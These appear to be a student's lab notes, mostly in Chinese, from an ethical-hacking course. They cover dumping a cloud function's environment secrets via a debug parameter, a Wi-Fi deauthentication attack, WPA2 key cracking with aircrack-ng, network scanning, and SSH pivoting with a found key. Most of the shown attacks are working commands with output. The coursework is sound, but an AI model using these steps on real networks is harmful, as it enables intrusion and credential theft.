root@en2720-w11-cloud-hopper:~/.7# curl "https://europe-west1-en2720-2017.cloudfunctions.net/twmn_cloud_hack_en2720-w11?debug=f6Bpn0m9WG&message=1" -H "Authorization: Bearer $TOKEN"
{"from":"Ethical Hacking Function","message":"Hello, I am a cloud function."}

# POST
root@en2720-w11-cloud-hopper:~/.7# curl "https://europe-west1-en2720-2017.cloudfunctions.net/twmn_cloud_hack_en2720-w11" -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"message": "1", "debug": "1"}' 
{"from":"Ethical Hacking Function","message":"1"}

root@en2720-w11-cloud-hopper:~/.7# curl "https://europe-west1-en2720-2017.cloudfunctions.net/twmn_cloud_hack_en2720-w11" -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"message": "1", "debug": "f6Bpn0m9WG"}' 
{"from":"Ethical Hacking Function","message":"Hello, I am a cloud function."}

root@en2720-w11-cloud-hopper:~/.7# curl "https://europe-west1-en2720-2017.cloudfunctions.net/twmn_cloud_hack_en2720-w11" -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"message":"process.env" , "debug": "f6Bpn0m9WG"}' 
{"from":"Ethical Hacking Function","message":{"GCF_BLOCK_RUNTIME_nodejs6":"410","LD_LIBRARY_PATH":"/layers/google.nodejs.runtime/node/lib","FUNCTION_TARGET":"iDareYouToHackMe","GCF_BLOCK_RUNTIME_go112":"410","NODE_OPTIONS":"--max-old-space-size=64","PASSWORD":"f6Bpn0m9WG","PWD":"/workspace","HOME":"/root","DEBIAN_FRONTEND":"noninteractive","PORT":"8080","K_REVISION":"1","FLAG":"flag{83186535ae7a6d39dda377da003a4dc85eab34e8893abf}","K_SERVICE":"twmn_cloud_hack_en2720-w11","SHLVL":"1","FUNCTION_SIGNATURE_TYPE":"http","PATH":"/layers/google.nodejs.runtime/node/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","_":"/layers/google.nodejs.functions-framework/functions-framework/node_modules/.bin/functions-framework"}}

```

## Wifi cracking/Traffic sniffing
之前找到过一个SSH端口filtered的机器，开着FTP端口。可能是使用了21作为ssh入口，过滤是只允许内网机器连ssh。其他的全扫了也没有后门端口，要不就是正常在用的80或23.

hint会直接告诉你21端口。可以一个个扫banner扫出来。
```
sudo /usr/sbin/sshd -f /etc/ssh/sshd_config -d
```
```
ssh -R 4444:10.0.6.168:21 kali@192.168.0.7 -i buck
```

可以转发端口，但没必要，直接在cloud-hopper上面用了这个。用户名是在.pub里面看到的。

可以在lord_nikon@en2720-w11-buckeye上面运行
```shell
ssh razor@10.0.6.168 -i wifi-ssh-key -p 21

razor@en2720-w11-fancy-bear:~$ sudo -l
Matching Defaults entries for razor on en2720-w11-fancy-bear:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User razor may run the following commands on en2720-w11-fancy-bear:
    (ALL : ALL) !ALL
    (root) NOPASSWD: /usr/sbin/airmon-ng st*, /usr/sbin/tcpdump, !/usr/sbin/tcpdump *-z*, /usr/bin/tshark,
        /usr/sbin/airodump-ng, /usr/sbin/aireplay-ng, /usr/bin/aircrack-ng, /sbin/iwconfig, /sbin/ifconfig,
        /usr/sbin/iw, /usr/bin/wireshark, /usr/local/sbin/wpa_supplicant, /usr/bin/killall airodump-ng,
        /sbin/dhclient, /sbin/reboot, /usr/bin/pkill -s 0 wpa_supplicant, !/usr/local/sbin/wpa_supplicant
        *-B*, /usr/bin/killall dhclient
        
razor@en2720-w11-fancy-bear:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: sta3-eth1@if30: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 66:6f:7b:c5:15:3c brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.168.1.3/24 brd 192.168.1.255 scope global sta3-eth1
       valid_lft forever preferred_lft forever
4: mon0: <BROADCAST,ALLMULTI,PROMISC,NOTRAILERS,UP,LOWER_UP> mtu 1500 qdisc mq state UNKNOWN group default qlen 1000
    link/ieee802.11/radiotap 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff
5: mon1: <BROADCAST,ALLMULTI,PROMISC,NOTRAILERS,UP,LOWER_UP> mtu 1500 qdisc mq state UNKNOWN group default qlen 1000
    link/ieee802.11/radiotap 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff
21: sta3-wlan0: <NO-CARRIER,BROADCAST,ALLMULTI,PROMISC,NOTRAILERS,UP,LOWER_UP> mtu 1500 qdisc mq state DORMANT group default qlen 1000
    link/ieee802.11/radiotap 78:3b:de:68:53:3e brd ff:ff:ff:ff:ff:ff

```



### iw命令
有两个 mon0,mon1可以省略一步增加设备的：
```
razor@en2720-w11-fancy-bear:~$ sudo iw dev sta3-wlan0 interface add mon0 type monitor
razor@en2720-w11-fancy-bear:~$ iw sta3-wlan0 info
Interface sta3-wlan0
        ifindex 21
        wdev 0xd00000001
        addr 78:3b:de:68:53:3e
        type monitor
        wiphy 13
        channel 10 (2457 MHz), width: 20 MHz (no HT), center1: 2457 MHz
        txpower 20.00 dBm

```
### airodump-ng
通过mon0监听流量：(记得指定channel
```
sudo airodump-ng --output-format pcap --write 2.pcap mon0 -c 1
```
另开一个session to capture a 4-way handshake to crack WPA2, by forcing the clients to reconnect by performing a deauthentication attack
```
sudo aireplay-ng -0 10 -a 50:B0:19:AE:21:EF sta3-wlan0
```

scp传送，注意要用-P大写
```
scp -P 21 -i key razor@10.0.6.168:/home/razor/1.pcap-01.cap /home/lord_nikon/.7
```
### aircrack-ng 本地破解

```
sudo aircrack-ng -w /usr/share/wordlists/fern-wifi/common.txt wifi.pcap

sudo aircrack-ng -w /usr/share/wordlists/sqlmap.txt wifi.pcap
```

1 potential targets


                               Aircrack-ng 1.6 

      [00:00:12] 51642/1633938 keys tested (4200.60 k/s) 

      Time left: 6 minutes, 16 seconds                           3.16%

                          KEY FOUND! [ 1234567890 ]


      Master Key     : 73 98 0B 7B 15 EE 6A 37 EB 9D 85 75 4C 0E FC 89 
                       71 F8 4F 67 0D C2 82 42 13 89 C9 71 6E 27 0E 11 

      Transient Key  : 3A 9D AF EF 91 16 73 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      EAPOL HMAC     : 92 27 23 9B 33 A6 96 00 32 94 DF A0 F5 D9 05 99 

### 解包
https://kalitut.com/decrypt-wi-fi-traffic-wireshark/
失败
https://www.aircrack-ng.org/doku.php?id=wpa_capture
wpa包的解析

最后按照老师给的工具来试试
airdecap-ng ellingson-mineral a.cap -p 1234567890


## Wifi cracking

准备一个配置文件wpa_supplicant configuration file
```
razor@en2720-w11-fancy-bear:~/.7$ cat ell.conf 
network={
  ssid="ellingson-mineral"
  psk="1234567890"
  proto=WPA2
  pairwise=CCMP
  key_mgmt=WPA-PSK
}
```

获取IP地址
```
razor@en2720-w11-fancy-bear:~/.7$ sudo iw mon0 del
razor@en2720-w11-fancy-bear:~/.7$ nano ell.conf
razor@en2720-w11-fancy-bear:~/.7$ ls
2.pcap-01.cap  3.pcap-01.cap  ell.conf
razor@en2720-w11-fancy-bear:~/.7$ vim ell.conf 
razor@en2720-w11-fancy-bear:~/.7$ sudo wp
wpa_cli         wpa_passphrase  wpa_supplicant  wpaclean        
razor@en2720-w11-fancy-bear:~/.7$ sudo wpa_supplicant -i sta3-wlan0 -c ell.conf &
[1] 12265
razor@en2720-w11-fancy-bear:~/.7$ Successfully initialized wpa_supplicant
sta3-wlan0: SME: Trying to authenticate with 50:b0:19:ae:21:ef (SSID='ellingson-mineral' freq=2412 MHz)
sta3-wlan0: Trying to associate with 50:b0:19:ae:21:ef (SSID='ellingson-mineral' freq=2412 MHz)
sta3-wlan0: Associated with 50:b0:19:ae:21:ef
sta3-wlan0: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
sta3-wlan0: WPA: Key negotiation completed with 50:b0:19:ae:21:ef [PTK=CCMP GTK=CCMP]
sta3-wlan0: CTRL-EVENT-CONNECTED - Connection to 50:b0:19:ae:21:ef completed [id=0 id_str=]

razor@en2720-w11-fancy-bear:~/.7$ iw dev sta3-wlan0 link
Connected to 50:b0:19:ae:21:ef (on sta3-wlan0)
        SSID: ellingson-mineral
        freq: 2412
        RX: 43208 bytes (723 packets)
        TX: 543 bytes (5 packets)
        signal: -36 dBm
        tx bitrate: 1.0 MBit/s

        bss flags:      short-slot-time
        dtim period:    2
        beacon int:     100
razor@en2720-w11-fancy-bear:~/.7$ sudo dhclient sta3-wlan0
razor@en2720-w11-fancy-bear:~/.7$ ip addr show sta3-wlan0
21: sta3-wlan0: <BROADCAST,ALLMULTI,PROMISC,NOTRAILERS,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 78:3b:de:68:53:3e brd ff:ff:ff:ff:ff:ff
    inet 172.20.0.20/24 brd 172.20.0.255 scope global sta3-wlan0
       valid_lft forever preferred_lft forever
```

寻找下一个目标机器
```
razor@en2720-w11-fancy-bear:~/.7$ nmap 172.20.0.0-255

Starting Nmap 7.60 ( https://nmap.org ) at 2022-10-16 16:42 CEST
Nmap scan report for 172.20.0.1
Host is up (0.0016s latency).
All 1000 scanned ports on 172.20.0.1 are closed

Nmap scan report for 172.20.0.2
Host is up (0.0017s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE
80/tcp  open  http
777/tcp open  multiling-http

Nmap scan report for 172.20.0.4
Host is up (0.00080s latency).
All 1000 scanned ports on 172.20.0.4 are closed

Nmap scan report for 172.20.0.5
Host is up (0.00086s latency).
All 1000 scanned ports on 172.20.0.5 are closed

Nmap scan report for 172.20.0.6
Host is up (0.0013s latency).
All 1000 scanned ports on 172.20.0.6 are closed

Nmap scan report for 172.20.0.20
Host is up (0.0012s latency).
All 1000 scanned ports on 172.20.0.20 are closed

Nmap scan report for 172.20.0.254
Host is up (0.00040s latency).
Not shown: 999 closed ports
PORT   STATE    SERVICE
22/tcp filtered ssh

Nmap done: 256 IP addresses (7 hosts up) scanned in 16.75 seconds

razor@en2720-w11-fancy-bear:~/.7$ curl 172.20.0.2
<head><title>172.20.0.2:80/</title></head>
<body bgcolor=white text=black link=darkblue vlink=firebrick alink=red>
<h1>listing: 
<a href="/">/</a></h1><hr noshade size=1><pre>
<b>access      user      group     date             size  name</b>

-rw-------     65534     65534  Oct 16 01:00    71 kB  <a href="flag{18dd8ff4747815ee60693510d761d3b49b248f35a3f8d7}.jpg">flag{18dd8ff4747815ee60693510d761d3b49b248f35a3f8d7}.jpg</a>
</pre><hr noshade size=1>
<small><a href="http://bytesex.org/webfs.html">webfs/1.21</a> &nbsp; 16/Oct/2022 14:43:57 GMT</small>
</body>
razor@en2720-w11-fancy-bear:~/.7$ wget 172.20.0.2/flag{18dd8ff4747815ee60693510d761d3b49b248f35a3f8d7}.jpg
--2022-10-16 16:44:39--  http://172.20.0.2/flag%7B18dd8ff4747815ee60693510d761d3b49b248f35a3f8d7%7D.jpg
Connecting to 172.20.0.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 72906 (71K) [image/jpeg]
Saving to: ‘flag{18dd8ff4747815ee60693510d761d3b49b248f35a3f8d7}.jpg’

flag{18dd8ff4747815ee606935 100%[========================================>]  71.20K  --.-KB/s    in 0.05s   

2022-10-16 16:44:39 (1.51 MB/s) - ‘flag{18dd8ff4747815ee60693510d761d3b49b248f35a3f8d7}.jpg’ saved [72906/72906]

```

# Learning Notes

## Exploit development

### bash
https://wangdoc.com/bash/intro.html

### process
&
fg bg jobs
signal 
- systemctl
检查单元(cron.service)是否启用: systemctl is-enabled crond.service
检查单元或服务是否正在运行: systemctl status firewalld.service
列出所有服务（包括启用和禁用）：systemctl list-unit-files --type=service
systemctl start httpd.service
systemctl restart httpd.service
systemctl stop httpd.service
systemctl reload httpd.service
systemctl status httpd.service

### grep:
以递归的方式查找符合条件的文件。例如，查找指定目录/etc/acpi 及其子目录（如果存在子目录的话）下所有文件中包含字符串"update"的文件，并打印出该字符串所在行的内容，使用的命令为：`grep -r update /etc/acpi `

### checksec
To protect the code while compiling.

## Exploit deployment

## Remote access
常用端口：https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-ports.html


### SSH 加密
使用ssh至少需要知道用户名和IP地址。
登陆方法有password和key。

    ssh-keygen -t rsa   #-t表示类型选项，这里采用rsa加密算法
    ssh-copy-id root@远程主机

非对称密钥加密法
1. 甲方生成一对密钥并将公钥公开
2. 需要向甲方发送信息的其他角色(乙方)使用该密钥(甲方的公钥)对机密信息进行加密后再发送给甲方
3. 甲方再用自己私钥对加密后的信息进行解密
4. 甲方想要回复乙方时正好相反，使用乙方的公钥对数据进行加密，同理，乙方使用自己的私钥来进行解密。

公钥登录（一般用RSA非对称加密）
1. 客户端生成密钥对
2. 将客户端的公钥写入服务器的密钥验证文件
3. 客户端请求登录，服务器生成一段随机字符串，并使用客户端公钥加密后发送给客户端
4. 客户端使用自己的私钥解密，并返回解密后的信息到服务器
5. 服务器进行信息对比，如果结果匹配，则允许登录

RSA 密钥的范围可以在 768 至 16384 位之间。
DSA 密钥必须是 1024 位。

- Permission denied(public key)
https://blog.csdn.net/yjk13703623757/article/details/114936739

- 渗透测试--Linux下登录凭证窃取技巧
https://beret.cc/2020/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Linux%E4%B8%8B%E7%99%BB%E5%BD%95%E5%87%AD%E8%AF%81%E7%AA%83%E5%8F%96%E6%8A%80%E5%B7%A7/

端口转发教程：https://lotabout.me/2019/SSH-Port-Forwarding/
### 传文件
在linux下一般用scp这个命令来通过ssh传输文件。

1、从服务器上下载文件
scp username@servername:/path/filename /var/www/local_dir（本地目录）

例如scp root@192.168.0.101:/var/www/test.txt  把192.168.0.101上的/var/www/test.txt 的文件下载到/var/www/local_dir（本地目录）
ssh razor@10.0.6.168 -p 21 -i wifi-ssh-key
scp razor@10.0.6.168:/home/razor/.7/10.pcap -P 21 -i wifi-ssh-key /root/.7/10.pcap
scp -P 4444 -i wifi-ssh-key razor@127.0.0.1:/home/razor/.7/10.pcap /home/kali/Desktop

2、上传本地文件到服务器
scp /path/filename username@servername:/path   

例如scp /var/www/test.php  root@192.168.0.101:/var/www/  把本机/var/www/目录下的test.php文件上传到192.168.0.101这台服务器上的/var/www/目录中

 

### 本地端口转发  
用于把本地机器（SSH客户端）的端口转发到服务器（SSH服务器），然后发给目标机器的某个端口。
> ssh -L [LOCAL_IP:]LOCAL_PORT:DESTINATION:DESTINATION_PORT [USER@]SSH_SERVER
本地机器监听LOCAL_PORT；
本地机器把所有发给LOCAL_PORT的TCP连接都发给指定的服务器，然后再连接到DESTINATION机器(这通常是服务器自己，也可以是任何其他机器)；
在DESTINATION机器看来，这个请求来自SSH服务器，相当于连到了服务器的内网。

例如服务器在 localhost:33062 上运行着 MySQL 的管理后端，暴露给公网会不够安全，这时就可以把本地 8080 端口转发给服务器的 33062：
> ssh -L 8080:localhost:33062 harttle@mysql.example.com
然后在本机访问 http://localhost:8080 就可以了。注意上述命令省略了本地 IP，默认本机所有 IP 都可以访问。注意这个命令会像往常一样，登录到服务器端的 Shell。如果只用来端口转发可以指定 -N 参数：这样会启动一个阻塞的进程，直到 Ctrl-C 手动终止掉。

### 远程端口转发
远程端口转发和本地端口转发正好相反，用来把服务器（SSH服务器）上的某个端口转发到本地机器，再转发给对应的服务。通常用于把本地机器的服务暴露给外网使用。
> ssh -R [REMOTE:]REMOTE_PORT:DESTINATION:DESTINATION_PORT [USER@]SSH_SERVER
SSH服务器 监听发往REMOTE_PORT上的请求，转发到本地机器，再发给 DESTINATION机器的DESTINATION_PORT端口。
例如本地有一个 Plex 媒体串流服务，希望在外网也可以访问。恰好有一台外网可以访问的服务器 example.com，那么可以
> ssh -R 8080:localhost:32400 harttle@example.com
然后本地的 Plex 服务就可以在外网通过 example.com:8080 来访问了。注意 32400 是 Plex 服务启动时绑定的端口，localhost 是 Plex 服务绑定的域。

REMOTE参数：
上面没有指定远程的 REMOTE，意味着可以通过远程机器的所有 IP 访问。否则如果指定了 localhost（注意这是 REMOTE 的域），则只能在服务器上通过 localhost 来访问，不能通过服务器的外网 IP 来访问了
> ssh -R localhost:8080:localhost:32400 harttle@example.com
REMOTE 在一台服务器上运行着多个域名时会比较有用，比如你可以分别绑定 plex.example.com:8080 到本地的 Plex 服务，同时绑定 smb.example.com:8080 到本地的 SMB 服务。

## Data exfiltration

## Password extraction
https://blog.codinghorror.com/dictionary-attacks-101/

Suggested dictionary： https://github.com/danielmiessler/SecLists/blob/master/Passwords/Malware/mirai-botnet.txt

- Hydra
kali自带暴力破解工具，直接命令行用上

- hash
彩虹表 https://crackstation.net/

## Reconnaissance Network scanning and vulnerability detection
### nmap
  - -sS (TCP SYN扫描):SYN扫描作为默认的也是最受欢迎的扫描选项
  - -sT (TCP connect()扫描):当SYN扫描不能用时，CP Connect()扫描就是默认的TCP扫描。
  - -sU (UDP扫描):虽然互联网上很多流行的服务运行在TCP 协议上，UDP服务也不少。 DNS，SNMP，和DHCP (注册的端口是53，161/162，和67/68)是最常见的三个。
cheatsheet
https://www.stationx.net/nmap-cheat-sheet/
https://highon.coffee/blog/nmap-cheat-sheet/

script
https://nmap.org/nsedoc/

### natcat
https://quickref.me/nc

重要的参数，略做介绍：
-4，-6 表示ipv 4和ipv6模式
-u 表示扫描UDP端口，默认是TCP端口
-o -x 结果输出到文件，x表示以二进制格式。
-v 结果的详细程度，可以多个v，比如-vv –vvv 数量越多表示结果越详细
-p –s 表示指定扫描源地址和ip。
-z 表零IO模式，表示扫描时不发送任何数据
-w 秒数 设置超时

TCP端口扫描
```
 nc -v -z -w2 192.168.0.3 1-100 
192.168.0.3: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.0.3] 80 (http) open
(UNKNOWN) [192.168.0.3] 23 (telnet) open
(UNKNOWN) [192.168.0.3] 22 (ssh) open
扫描192.168.0.3 的端口 范围是 1-100
```
扫描UDP端口
```
nc -u -z -w2 192.168.0.1 1-1000 //扫描192.168.0.3 的端口 范围是 1-1000
```
扫描指定端口
```
nc -nvv 192.168.0.1 80 //扫描 80端口
(UNKNOWN) [192.168.0.1] 80 (?) open
y  //用户输入
```

- 传输文件演示（先启动接收命令）
使用nc传输文件还是比较方便的，因为不用scp和rsync那种输入密码的操作了
把A机器上的一个rpm文件发送到B机器上
需注意操作次序，receiver先侦听端口，sender向receiver所在机器的该端口发送数据。
方法一
  1. 先在B机器上启动一个接收文件的监听，格式如下
    意思是把赖在9995端口接收到的数据都写到file文件里（这里文件名随意取）
    nc -l port >file  
    nc -l 9995 >zabbix.rpm
  2. 在A机器上往B机器的9995端口发送数据，把下面rpm包发送过去。B机器接收完毕，它会自动退出监听，文件大小和A机器一样，md5值也一样
  nc 10.0.1.162 9995 < zabbix-release-2.4-1.el6.noarch.rpm  
方法二（先启动发送命令）
  1. 先在B机器上，启动发送文件命令。下面命令表示通过本地的9992端口发送test.mv文件  
    nc -l 9992 < test.mv
  2. A机器上连接B机器，取接收文件。下面命令表示通过连接B机器的9992端口接收文件，并把文件存到本目录下，文件名为test2.mv  
    nc 10.0.1.162 9992 >test2.mv
传输目录演示（方法发送文件类似）
  1. B机器先启动监听，如下
    A机器给B机器发送多个文件
    传输目录需要结合其它的命令，比如tar
    经过我的测试管道后面最后必须是 - ，不能是其余自定义的文件名
    > nc -l 9995 | tar xfvz -
  2. A机器打包文件并连接B机器的端口
    管道前面表示把当前目录的所有文件打包为 - ，然后使用nc发送给B机器
    > tar cfz - * | nc 10.0.1.162 9995

### tcpdump


## web hacking
- general
https://www.hacker101.com/playlists/web_hacking
- database
whatweb
- 网页扫描 OWASP
https://wizardforcel.gitbooks.io/kali-linux-web-pentest-cookbook/content/ch10.html


# Appendix


<span id="jump">跳转到的地方</span>

使用markdown语法：[点击跳转](#jump)